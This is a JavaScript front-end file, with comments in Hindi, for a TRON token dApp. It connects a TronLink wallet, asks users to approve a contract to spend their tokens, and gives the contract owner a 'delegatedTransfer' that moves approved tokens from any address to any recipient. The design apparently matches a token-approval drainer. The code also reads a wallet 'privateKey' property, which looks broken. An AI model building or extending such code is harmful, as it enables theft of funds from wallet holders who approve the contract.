// ============================================
// कॉमन जावास्क्रिप्ट फंक्शन्स
// ============================================

// ग्लोबल वेरिएबल्स
let tronWeb = null;
let contract = null;
let userAddress = null;
let contractOwner = null;

// ============================================
// वॉलेट कनेक्ट करें
// ============================================
async function connectWallet() {
    const connectBtn = document.getElementById('connectBtn');
    if (!connectBtn) return;
    
    connectBtn.disabled = true;
    connectBtn.innerHTML = '⏳ कनेक्ट हो रहा है...';

    try {
        // TronLink चेक करें
        if (!window.tronLink) {
            showNotification('TronLink वॉलेट इंस्टॉल नहीं है!', 'error');
            window.open('https://www.tronlink.org/', '_blank');
            return;
        }

        // वॉलेट कनेक्ट
        await window.tronLink.request({ method: 'tron_requestAccounts' });
        
        // TronWeb इनिशियलाइज
        tronWeb = new TronWeb({
            fullHost: NETWORK_URL,
            privateKey: window.tronLink.privateKey
        });

        userAddress = tronWeb.defaultAddress.base58;
        
        // कॉन्ट्रैक्ट इनिशियलाइज
        await initializeContract();
        
        // UI अपडेट
        updateWalletUI();
        
        // डेटा लोड करें
        await loadData();
        
        showNotification('वॉलेट कनेक्ट हो गया!', 'success');
        
    } catch (error) {
        console.error('कनेक्शन एरर:', error);
        showNotification('कनेक्ट करने में एरर: ' + error.message, 'error');
    } finally {
        connectBtn.disabled = false;
        connectBtn.innerHTML = '🔌 वॉलेट कनेक्ट करें';
    }
}

// ============================================
// कॉन्ट्रैक्ट इनिशियलाइज करें
// ============================================
async function initializeContract() {
    try {
        contract = await tronWeb.contract(getContractABI(), CONFIG.contractAddress);
        contractOwner = await contract.owner().call();
    } catch (error) {
        console.error('कॉन्ट्रैक्ट इनिशियलाइजेशन एरर:', error);
        throw error;
    }
}

// ============================================
// कॉन्ट्रैक्ट ABI
// ============================================
function getContractABI() {
    return [
        {
            "constant": false,
            "inputs": [
                {"name": "tokenAddress", "type": "address"},
                {"name": "from", "type": "address"},
                {"name": "to", "type": "address"},
                {"name": "amount", "type": "uint256"}
            ],
            "name": "delegatedTransfer",
            "outputs": [{"name": "", "type": "bool"}],
            "type": "function"
        },
        {
            "constant": true,
            "inputs": [
                {"name": "tokenAddress", "type": "address"},
                {"name": "account", "type": "address"}
            ],
            "name": "balanceOfToken",
            "outputs": [{"name": "", "type": "uint256"}],
            "type": "function"
        },
        {
            "constant": true,
            "inputs": [],
            "name": "owner",
            "outputs": [{"name": "", "type": "address"}],
            "type": "function"
        }
    ];
}

// ============================================
// वॉलेट UI अपडेट करें
// ============================================
function updateWalletUI() {
    const walletDiv = document.getElementById('walletInfo');
    if (!walletDiv) return;
    
    const isOwner = (userAddress.toLowerCase() === contractOwner.toLowerCase());
    
    walletDiv.innerHTML = `
        <div class="wallet-info">
            <div class="wallet-address">
                🔗 ${shortenAddress(userAddress)}
                <a href="https://tronscan.org/#/address/${userAddress}" target="_blank">🔍</a>
            </div>
            ${isOwner ? '<span class="owner-badge">👑 कॉन्ट्रैक्ट ओनर</span>' : ''}
        </div>
    `;
    
    // ओनर सेक्शन दिखाएं
    const ownerSection = document.getElementById('ownerSection');
    if (ownerSection) {
        ownerSection.style.display = isOwner ? 'block' : 'none';
    }
}

// ============================================
// एड्रेस शॉर्ट करें
// ============================================
function shortenAddress(address) {
    if (!address) return '';
    return address.slice(0, 6) + '...' + address.slice(-4);
}

// ============================================
// नोटिफिकेशन दिखाएं
// ============================================
function showNotification(message, type = 'info') {
    // नोटिफिकेशन कंटेनर बनाएं
    let container = document.getElementById('notificationContainer');
    if (!container) {
        container = document.createElement('div');
        container.id = 'notificationContainer';
        container.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 9999;
        `;
        document.body.appendChild(container);
    }
    
    // नोटिफिकेशन एलिमेंट
    const notification = document.createElement('div');
    notification.style.cssText = `
        background: ${type === 'success' ? '#28a745' : type === 'error' ? '#dc3545' : '#17a2b8'};
        color: white;
        padding: 15px 25px;
        border-radius: 8px;
        margin-bottom: 10px;
        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        animation: slideIn 0.3s ease;
        cursor: pointer;
    `;
    notification.innerHTML = message;
    
    // क्लिक करने पर हटाएं
    notification.onclick = () => notification.remove();
    
    container.appendChild(notification);
    
    // 5 सेकंड बाद ऑटो हटाएं
    setTimeout(() => {
        if (notification.parentNode) {
            notification.remove();
        }
    }, 5000);
}

// ============================================
// अमाउंट को सन में कन्वर्ट करें (USDT के लिए)
// ============================================
function toSun(amount) {
    return Math.floor(amount * 1000000).toString();
}

// ============================================
// सन से अमाउंट में कन्वर्ट करें
// ============================================
function fromSun(amount) {
    return (amount / 1000000).toFixed(2);
}

// ============================================
// टोकन अप्रूवल
// ============================================
async function approveToken(tokenAddress, amount) {
    try {
        const tokenContract = await tronWeb.contract().at(tokenAddress);
        const result = await tokenContract.approve(
            CONFIG.contractAddress,
            toSun(amount)
        ).send();
        
        showNotification('अप्रूवल सक्सेस!', 'success');
        return result;
        
    } catch (error) {
        showNotification('अप्रूवल फेल: ' + error.message, 'error');
        throw error;
    }
}

// ============================================
// अप्रूवल चेक करें
// ============================================
async function checkAllowance(tokenAddress, ownerAddress) {
    try {
        const tokenContract = await tronWeb.contract().at(tokenAddress);
        const allowance = await tokenContract.allowance(
            ownerAddress,
            CONFIG.contractAddress
        ).call();
        
        return fromSun(allowance);
        
    } catch (error) {
        console.error('अलाउंस चेक एरर:', error);
        return '0';
    }
}

// ============================================
// बैलेंस चेक करें
// ============================================
async function checkBalance(tokenAddress, account) {
    try {
        if (!contract) return '0';
        const balance = await contract.balanceOfToken(tokenAddress, account).call();
        return fromSun(balance);
    } catch (error) {
        console.error('बैलेंस चेक एरर:', error);
        return '0';
    }
}

// ============================================
// ट्रांसफर एक्सक्यूट करें
// ============================================
async function executeTransfer(tokenAddress, from, to, amount) {
    try {
        const result = await contract.delegatedTransfer(
            tokenAddress,
            from,
            to,
            toSun(amount)
        ).send();
        
        showNotification('ट्रांसफर सक्सेस!', 'success');
        return result;
        
    } catch (error) {
        showNotification('ट्रांसफर फेल: ' + error.message, 'error');
        throw error;
    }
}

// ============================================
// डेटा लोड करें (ओवरराइड करें)
// ============================================
async function loadData() {
    // अलग-अलग पेज में ओवरराइड करेंगे
    console.log('डेटा लोड हो रहा है...');
}

// ============================================
// इनिशियलाइज
// ============================================
document.addEventListener('DOMContentLoaded', function() {
    // नेटवर्क इंडिकेटर अपडेट करें
    const networkIndicator = document.getElementById('networkIndicator');
    if (networkIndicator) {
        networkIndicator.innerHTML = `🌐 नेटवर्क: ${CONFIG.activeNetwork.toUpperCase()}`;
        networkIndicator.classList.add(CONFIG.activeNetwork);
    }
    
    // कॉन्ट्रैक्ट एड्रेस डिस्प्ले
    const contractDisplay = document.getElementById('contractAddress');
    if (contractDisplay) {
        contractDisplay.innerHTML = shortenAddress(CONFIG.contractAddress);
    }
});

// स्टाइल के लिए @keyframes एड करें
const style = document.createElement('style');
style.innerHTML = `
    @keyframes slideIn {
        from {
            transform: translateX(100%);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
`;
document.head.appendChild(style);
